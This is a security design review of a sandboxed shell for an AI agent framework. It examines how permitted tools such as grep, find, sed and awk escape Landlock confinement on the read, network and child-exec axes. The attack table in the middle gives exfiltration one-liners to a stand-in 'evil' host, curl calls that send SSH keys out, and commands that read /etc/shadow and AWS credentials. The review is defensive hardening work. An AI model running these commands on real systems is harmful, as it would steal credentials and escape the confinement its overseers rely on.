# Review — OCAP shell axis coverage ("Wrap vs. Reimplement" design note)

- Date: 2026-06-24
- Scope: a grounded, adversarial review of the design note *"Object-Capability
  Shell — Wrap vs. Reimplement"* against the **shipped** state of `agent-bridle`
  + `newt-agent` and the **target** (dev-branch) brush-backed confined shell.
- Outcome: **ADR 0004** (axis-granular confinement honesty + the un-stub gate +
  fence-strength-is-derived). No invariant changed; no code on `main` altered.
- Method: 26 subagents — 4 review lenses (reconcile / security-adversary /
  architecture / portability) each fanned into per-finding adversarial
  verification that re-read the code. **Verdict tally: 11 hold, 9 needs-nuance,
  1 refuted** (one verify straggler hung; results harvested from the run journal).

---

## TL;DR

The note is a clean **re-derivation** of decisions this line already made and, in
several cases, already shipped (ADR 0001 three layers; ADR 0002 the I1–I14
contract; ADR 0003 the honest stub state; `newt-agent`'s
`agentic_object_capability_security.md`). Its central thesis — *"a validate-only
wrapper isn't ocap; you must translate the capability into an OS-enforced boundary
before exec"* — is **already decided** (ADR 0001 L2-vs-L3; ADR 0002 I4/I10).

Its forward-looking value is narrow but real:

1. It **quantifies, against running code**, exactly which axes a permitted external
   "swamp" tool (`grep`/`find`/`sed`/`awk`) escapes on once the real shell is
   un-stubbed — `fs_read`, child-`exec`, and `net` egress — confirming (with
   concrete attack strings) the limit ADR 0002 acknowledges in prose.
2. It surfaces that **I9 honesty must become axis-granular**: a single
   `sandbox_kind: Landlock` will be true-but-misleading the moment the real shell
   applies `fs_write`-only Landlock while leaving three axes ambient.
3. It contributes a genuinely-novel **governance guardrail** (its C10/C11): fence
   strength must be *derived from declared capabilities*, with domains as presets
   over that declaration — **never** a domain→strength map; `code` is the
   *strictest* preset, not the loosest.

These became ADR 0004 D1/D2/D3.

## The critical reconciliation (what the first pass got wrong)

The initial audit read the confinement code from a branch **behind `main`**. On
`main`:

- **The brush-backed confined shell is a fail-closed STUB** (ADR 0003).
  `ShellTool::invoke` returns *"shell tool is temporarily unavailable"* on every
  call, pending `reubeno/brush#1184` + `agent-bridle#20`. `sandbox_kind` honestly
  reports `None`.
- The real shell — with the `CaveatInterceptor` (L2), the curated builtins
  (I7, no `exec`), and the `fs_write` `LandlockSandbox` (I10) — is the **target**,
  on the dev branch. `agent-bridle-core/src/sandbox.rs` (the `fs_write` first
  increment) **is** on `main`, but I10 "is not exercised" while the shell stubs.
- The only way to actually run a command in a shipping newt build is the
  **embedder's fail-open allowance** (`newt --yolo` / `NEWT_DISABLE_OCAP=1`),
  which routes `run_command` *around* bridle to the plain host shell
  (`sandbox_kind = none`, fully unconfined) — an explicit, disclosed, per-invocation
  human choice (ADR 0003).

So the live posture is **binary**: fail-closed (stub) or fully-unbridled (`--yolo`).
The "swamp escapes the sandbox" findings are therefore **not a live leak in
shipping builds** — they are a property of the **target** shell that must be
addressed **before it is un-stubbed**, or the un-stub becomes a 3-axis
confinement *regression* relative to the fail-closed stub.

## Verified findings (target shell; gate the un-stub)

All four attacks were verified line-by-line against the dev-branch shell +
`sandbox.rs`; the security blockers all **held** under adversarial re-check. Each
exploits that brush's `before_exec`/`before_open` see only brush's *own*
ops — once a permitted external binary runs, its interior is L2-invisible — and
that L3 governs `fs_write` only.

| Attack (tool is `exec`-permitted) | Escapes? | Hole axis | Backstop that closes it |
|---|---|---|---|
| `find . -exec curl https://evil/$(cat /etc/passwd) \;` | **yes** | net + read + child-exec | netns deny-default egress (brokered proxy) / Landlock-net ≥6.7 / seccomp `connect` |
| `awk 'BEGIN{system("curl …id_ed25519")}'` | **yes** | child-exec | seccomp `execve` deny / namespace w/ no shell / refuse shell-out flags at wrapper |
| `grep -f /etc/shadow` · `sed -n p ~/.aws/credentials` | **yes** | fs_read | Landlock read ruleset + curated loader/system-path allow-list |
| `sed 'w /etc/cron.d/evil'` | **no** (caught) | — | already: `fs_write` Landlock, inherited across fork/exec |
| `sed 'e curl …'` | **yes** | child-exec | as `awk` above |

`sed` is the canonical proof the sandbox is **one-axis deep, not tool-deep**:
`w` is contained, `e` is wide open — same tool, opposite outcome.

Two amplifiers the review confirmed:

- **The carried coreutils are not wired in.** `confined_builtins()` seeds only
  brush's bash builtins (`BuiltinSet::BashMode`, minus `exec`);
  `brush-coreutils-builtins` appears only in `Cargo.toml` + a doc comment, never in
  the shell builder. So `cat`/`ls`/`cp` **also** run as external binaries — the
  note's "reimplement the trivial 10% in-process" is not realized in the confined
  shell. (On `main`'s stub, the brush deps are removed entirely.)
- **The net gap is not "wait for kernel 6.7."** `LandlockSandbox::apply` never
  requests `AccessNet`/port rules at all — even on a 6.7+ kernel no net backstop
  is wired. 6.7 is necessary-but-far-from-sufficient.

## Re-derived vs. genuinely new

**Re-derived (cite, don't re-argue):**

- Validate-vs-translate; "attenuate, don't predict" → ADR 0001 (L1/L2/L3) +
  ADR 0002 I4. Decided for the filesystem axis; the note *extends* it on `net`
  (deliberately in-process-validated, I8 — no kernel translation for an external
  child's socket).
- "Declare capabilities, not modes" (positive half) → already the architecture:
  `Caveats` meet-semilattice (I2/I3), `ToolContext` mint-token (I1), plus
  capability-keyed presets (`NamedPermissionPreset`, `/mode`).
- The reimplement/wrap cut → already the shape (reimplement read/ls/search/patch
  in `newt-tools`; wrap externals at the funnel). Note: `newt-tools` is explicitly
  *temporary*, slated to delegate to `thoon-fileops` (unpublished).

**Genuinely new (kept in ADR 0004):**

- **Axis-granular I9** (D1): the single `SandboxKind` will overclaim once the real
  shell lands. Refinement of the honesty invariant.
- **The un-stub gate** (D2): make ADR 0002's acknowledged `fs_write`-only limit a
  *release gate*, so un-stubbing can't silently drop the exec floor below the
  stub's fail-closed default.
- **The domain-preset guardrail** (D3, the note's C10/C11): strength is derived;
  domains select presets but never key strength; `code` is the strictest preset.
  Absent from 0002/0003.

## Architecture nuance (the "fail-closed mint check" re-scoped)

The initial recommendation was a fail-closed `required_sandbox` check at
`Gate::authorize`. The adversarial pass **refuted** the naive version: the Gate's
`sandbox_kind` (set by the vestigial `with_sandbox`) is dead plumbing with no
non-test callers — it is always `None`, and the real enforcement is per-invocation
in the shell tool (`intended_sandbox_kind(cx.caveats())` → fail-closed
`apply_sandbox`, on the dev branch). On `main` the shell is a stub, so a mint
check would gate nothing. The genuine need is therefore **D1 (axis-granular
honesty) + D2 (the un-stub gate)**, with the fail-closed-on-unenforceable-axis
behavior landing **in the un-stub PR** under a **strong** strength (D3) — not a
core mint check on `main`.

## A separate tension to resolve (not in ADR 0004)

**Three "search a tree" surfaces, no owner:** `newt-tools/src/search.rs` (native,
slated for the unpublished `thoon-fileops`); `agent-bridle-tool-fs` (blueprint
only, unbuilt); and the note's wrapped-external `grep`. Recommendation: make
`agent-bridle-tool-fs` native search canonical (read-only → trivially confinable —
the right "reimplement" answer), have `newt-tools` delegate to it, and reserve
wrapped external `grep`/`find` for the genuine 90% (`-exec`, PCRE) that must go
through L3. Worth its own short ADR.

## Recommendation

1. **Ratify ADR 0004** (or amend) — it converts an acknowledged limit into a
   reviewable gate ahead of the un-stub, in the project's "never overclaim" spirit.
2. **Land the D1 primitive** (`enforcement_report(effective, kind)` in
   `agent-bridle-core`, pure + tested) so axis-granular honesty is ready before
   the shell consumes it.
3. **Treat the un-stub PR (agent-bridle#20 / brush#1184) as the place** for D2's
   fail-closed-on-unenforceable-axis behavior and the L3 axis sequencing
   (`fs_read` loader-allowlist; `net`/child-`exec` via netns/seccomp).
4. **Open a search-consolidation ADR.**

## Provenance & caveats

- The audited confinement code (`intended_sandbox_kind`, `apply_sandbox`,
  `CaveatInterceptor`, `LandlockSandbox` fs_write) is the **dev-branch target**,
  not `main` (where the shell is a stub). Findings are scoped accordingly.
- One of 22 verification subagents hung; its finding's review-stage claim is
  retained but unverified. All four security blockers were verified by other,
  completed skeptics.
- This review changed **no** code and **no** invariant; it adds two documents.
